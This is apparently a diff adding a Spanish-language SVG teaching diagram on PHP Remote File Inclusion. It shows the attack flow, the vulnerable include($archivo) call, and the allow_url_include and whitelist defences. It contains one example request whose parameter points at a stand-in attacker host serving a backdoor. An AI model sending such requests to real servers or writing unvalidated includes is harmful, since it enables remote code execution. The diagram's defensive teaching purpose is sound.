@@ -1,0 +1,30 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 740 450">
+<defs><marker id="t03-rfi-a" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path class="ink" d="M0 0L10 5L0 10z"/></marker><marker id="t03-rfi-r" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse"><path class="bad" d="M0 0L10 5L0 10z"/></marker><marker id="t03-rfi-g" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse"><path class="good" d="M0 0L10 5L0 10z"/></marker></defs>
+<text class="h" x="370" y="26" text-anchor="middle">RFI: el servidor ejecuta un archivo del atacante</text>
+<rect class="tint" x="16" y="44" width="708" height="62" rx="6"/>
+<text class="s" x="28" y="64">1. El atacante pide la página poniendo en el parámetro la dirección de su archivo:</text>
+<text x="28" y="92" font-family="Menlo,Consolas,monospace" style="font-size:14px" xml:space="preserve"><tspan>example.com/pagina.php?archivo=</tspan><tspan style="fill:var(--color-danger);font-weight:700">http://atacante.example.com/backdoor.txt</tspan></text>
+<g><circle class="c5" cx="80" cy="163.0" r="10.4"/><path class="c5" d="M61.8 196.8a18.2 18.2 0 0 1 36.4 0z"/></g>
+<text class="b" x="80" y="218" text-anchor="middle">Atacante</text>
+<rect class="c3" x="420" y="128" width="304" height="150" rx="10"/>
+<g><rect class="box" x="436" y="146" width="38.4" height="50.4" rx="3"/><path class="ln" d="M443.2 158.0h24.0M443.2 167.6h24.0M443.2 177.2h24.0"/><circle class="good" cx="464.8" cy="188.0" r="2.5"/></g>
+<text class="b" x="486" y="164">Servidor víctima (PHP)</text>
+<text class="s" x="486" y="182">incluye el archivo pedido:</text>
+<text x="486" y="208" font-family="Menlo,Consolas,monospace" xml:space="preserve" style="font-size:15px;font-weight:700">include($archivo)</text>
+<rect class="c5" x="436" y="226" width="272" height="38" rx="6"/>
+<text class="b" x="572" y="250" text-anchor="middle" style="font-size:15px">3. Lo ejecuta como código propio</text>
+<path class="path" d="M112 170H414" marker-end="url(#t03-rfi-r)"/>
+<text class="s" x="262" y="160" text-anchor="middle">1. pide la página</text>
+<path class="path" d="M414 200H112" marker-end="url(#t03-rfi-r)" stroke-dasharray="8 6"/>
+<text class="s" x="262" y="192" text-anchor="middle">4. puerta trasera: control remoto (RCE)</text>
+<rect class="c5" x="30" y="300" width="290" height="100" rx="10" style="fill-opacity:.4"/>
+<g><rect class="box" x="48" y="318" width="38.4" height="50.4" rx="3"/><path class="ln" d="M55.2 330.0h24.0M55.2 339.6h24.0M55.2 349.2h24.0"/><circle class="good" cx="76.8" cy="360.0" r="2.5"/></g>
+<text class="b" x="98" y="336">atacante.example.com</text>
+<text class="s" x="98" y="354">servidor del atacante</text>
+<rect class="c5" x="98" y="364" width="22" height="26" rx="3"/>
+<text x="128" y="384" font-family="Menlo,Consolas,monospace" xml:space="preserve" style="font-size:14px;font-weight:700">backdoor.txt</text>
+<path class="ln" d="M500 280L330 340" marker-end="url(#t03-rfi-a)"/>
+<text class="s" x="470" y="326">2. Descarga</text>
+<text class="s" x="470" y="344">backdoor.txt</text>
+<text class="s" x="370" y="424" text-anchor="middle">Defensa: allow_url_include = Off en php.ini corta el paso 2; y lista blanca de archivos.</text>
+</svg>
